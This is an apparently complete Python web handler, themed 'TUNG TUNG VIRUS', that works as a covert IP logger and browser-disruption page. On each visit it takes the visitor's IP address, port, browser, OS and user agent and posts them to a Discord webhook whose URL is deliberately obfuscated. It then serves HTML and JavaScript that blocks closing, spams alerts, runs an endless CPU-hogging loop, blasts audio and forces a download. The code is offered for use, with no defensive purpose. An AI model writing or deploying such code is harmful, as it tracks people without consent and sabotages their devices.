from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import base64
import sys

# =============================================================================
# MULTI-LAYER OBFUSCATION (3 layers + Base64)
# Layer 1 (innermost): string reversed
# Layer 2: XOR cipher with key
#
# 
# The real webhook URL is NEVER visible in plain text.
# Only the decode function can recover it at runtime.
# =============================================================================

def unhide_webhook():
    # Heavily obfuscated payload (reverse of the 3-layer process)
    encoded = "IjcxNjoBXzJFOUEvFxw6Fh4tIjoeABE4HxZMKgAzOTIcShoxQEU9NU0sKUcyKBcBRAU7GB0qGSE8JF9WHj0WIzc8PwpIQEZZUk5aQUVGTUdeUUBEXl5CWF0GGBsaBgURAkEOBghdGBwXWwoVGxYdDhJGXU8ABAEaDw=="
    
    # Layer 3: Base64 decode
    step1 = base64.b64decode(encoded).decode('utf-8')
    
    # Layer 2: XOR decrypt (same key used during encoding)
    key = "tungtungvirus"
    step2 = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(step1))
    
    # Layer 1: reverse back to original
    return step2[::-1]

# This is the ONLY place the real URL exists (in memory at runtime)
WEBHOOK_URL = unhide_webhook()

# DEBUG: Print the decoded URL so you can verify it's correct
print("✅ DEBUG: Webhook URL successfully unhidden:", WEBHOOK_URL, file=sys.stderr)

FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

# Max annoying page + loud song + HEAVY CPU lag
ANNOY_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TUNG TUNG VIRUS</title>
  <style>body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}#overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}</style>
</head>
<body>
  <div id="overlay">
    <h1 style="font-size:6em;animation:blink 0.3s infinite;">TUNG TUNG VIRUS</h1>
    <p style="font-size:2em;">Your browser is now mine...</p>
  </div>
  <!-- Loud Tung Tung Song -->
  <audio id="song" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>
  <script>
    // Fullscreen
    document.documentElement.requestFullscreen?.().catch(()=>{});
    // Block closing
    window.onbeforeunload = () => "TUNG TUNG says NO!";
    // Spam alerts
    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 700);
    // HEAVY CPU EATER (this lags the browser badly)
    function cpuHell() {
      while(true) {
        for(let i = 0; i < 20000000; i++) {
          Math.sin(i) * Math.cos(i) * Math.random();
        }
        setTimeout(cpuHell, 0);
      }
    }
    cpuHell();
    // Max volume song
    const audio = document.getElementById("song");
    audio.volume = 1.0;
    audio.play().catch(()=>{});
    // Force GIF download
    const link = document.createElement('a');
    link.href = "%s";
    link.download = "tung-tung-virus.gif";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  </script>
</body>
</html>
""" % FAKE_IMAGE_URL

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            port = self.headers.get('X-Forwarded-Port', 'Unknown')
            user_agent = self.headers.get('User-Agent', 'Unknown')
            parsed = httpagentparser.detect(user_agent)
            log = f"""**NEW CLICK!**
IP: `{ip}`
Port: `{port}`
Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
OS: {parsed.get('os', {}).get('name', 'Unknown')}
UA: `{user_agent}`
**Tung Tung + loud song + CPU hell activated!**"""

            # === FIXED & IMPROVED WEBHOOK SEND ===
            print("📤 Attempting to send webhook...", file=sys.stderr)
            response = requests.post(
                WEBHOOK_URL,
                json={"content": log},
                timeout=10
            )
            response.raise_for_status()  # This will raise if Discord returns error (401, 429, etc.)
            print(f"✅ Webhook sent successfully! Discord status: {response.status_code}", file=sys.stderr)

            html = ANNOY_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)

        except requests.exceptions.RequestException as e:
            # Specific error for webhook problems
            error_msg = f"Webhook failed: {str(e)}"
            print("❌ " + error_msg, file=sys.stderr)
            self.send_response(200)  # Still serve the prank page even if webhook fails
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(ANNOY_HTML.encode('utf-8'))
        except Exception as e:
            # Catch everything else
            print(f"❌ Unexpected error: {str(e)}", file=sys.stderr)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_HEAD(self):
        self.do_GET()
